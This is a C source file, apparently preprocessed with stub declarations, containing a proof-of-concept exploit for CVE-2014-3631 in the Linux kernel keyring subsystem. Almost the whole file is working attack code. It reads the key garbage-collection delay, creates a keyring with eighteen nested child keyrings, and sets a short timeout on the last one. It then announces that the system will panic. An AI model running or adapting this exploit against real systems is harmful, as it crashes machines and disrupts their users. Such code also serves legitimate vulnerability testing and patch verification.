
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int kname ;
typedef int key_serial_t ;


 int KEY_SPEC_USER_KEYRING ;
 int O_RDONLY ;
 int add_key (char*,char*,int *,int ,int) ;
 int atoi (char*) ;
 int close (int) ;
 int keyctl_set_timeout (int,int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int open (char*,int ) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int read (int,char*,int) ;
 int sprintf (char*,char*,int) ;
 int strlen (char*) ;

int main()
{
  key_serial_t currentKey = 0;
  key_serial_t topKey = 0;
  int i = 0;
  int fp;
  char kname[16]={0};
  char gc_delay[16] = {0};
  int delay =0;

  printf("[cve_2014_3631]: Preparing to exploit.\n");


  fp = open("/proc/sys/kernel/keys/gc_delay",O_RDONLY);
  if(fp == -1)
  {
     printf("[cve_2014_3631 error]: Could not open /proc/sys/kernel/keys/gc_delay, assuming delay is 5 minutes. \n");
     delay = 300;
  }
  else
  {
    read(fp,gc_delay,sizeof(gc_delay-1));
    delay = atoi(gc_delay);
    close(fp);
  }


  topKey = add_key("keyring","Lvl1K",((void*)0),0,KEY_SPEC_USER_KEYRING);
  if(topKey == -1)
  {
    printf("[cve_2014_3631 error]: keyring  fault\n");
    perror("add_key");
    return -1;
  }


  for(i=0; i< 18; i++)
  {
    memset(kname,00,sizeof(kname));
    memcpy(kname,"Lvl2K_",strlen("Lvl2K_"));
    sprintf(kname+strlen("Lvl2K_"),"%d",i);
    currentKey = add_key("keyring",kname,((void*)0),0,topKey);
    if(currentKey == -1)
    {
      printf("[cve_2014_3631 error]: keyring  fault\n");
      perror("add_key");
      return -1;
    }
  }


  printf("[cve_2014_3631]:  Exploit!\n");


  keyctl_set_timeout(currentKey, 2);


  printf("[cve_2014_3631]: Exploit triggered, system will panic in  %d seconds..\n",delay);

  return 0;
}
